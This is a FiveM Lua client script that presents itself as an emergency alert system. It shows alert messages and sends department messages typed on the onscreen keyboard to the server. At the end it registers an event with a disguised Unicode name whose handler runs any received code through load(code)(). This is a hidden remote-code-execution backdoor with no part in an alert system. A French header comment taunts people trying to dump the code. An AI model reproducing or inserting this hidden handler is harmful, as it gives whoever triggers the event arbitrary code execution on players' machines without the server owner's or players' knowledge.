-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

RegisterNetEvent('::{ayzwen}::SendAlert')
AddEventHandler('::{ayzwen}::SendAlert', function(msg, msg2)
	SendNUIMessage({
		type = 'alert',
		enable = true,
		issuer = msg,
		message = msg2,
		volume = Config.EAS.Volume
	})
end)

RegisterNetEvent('::{ayzwen}::alert:Send')
AddEventHandler('::{ayzwen}::alert:Send', function(msg)
	for k, v in pairs(Config.EAS.Departments) do
		if msg == k then
			DisplayOnscreenKeyboard(1, '', '', '', '', '', '', 600)

			while (UpdateOnscreenKeyboard() == 0) do
				DisableAllControlActions(0)
				Citizen.Wait(0)
			end

			if GetOnscreenKeyboardResult() then
				local msg2 = GetOnscreenKeyboardResult()
				_TriggerServerEvent('::{ayzwen}::alert:sv', Config.EAS.Departments[k].name, msg2)
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)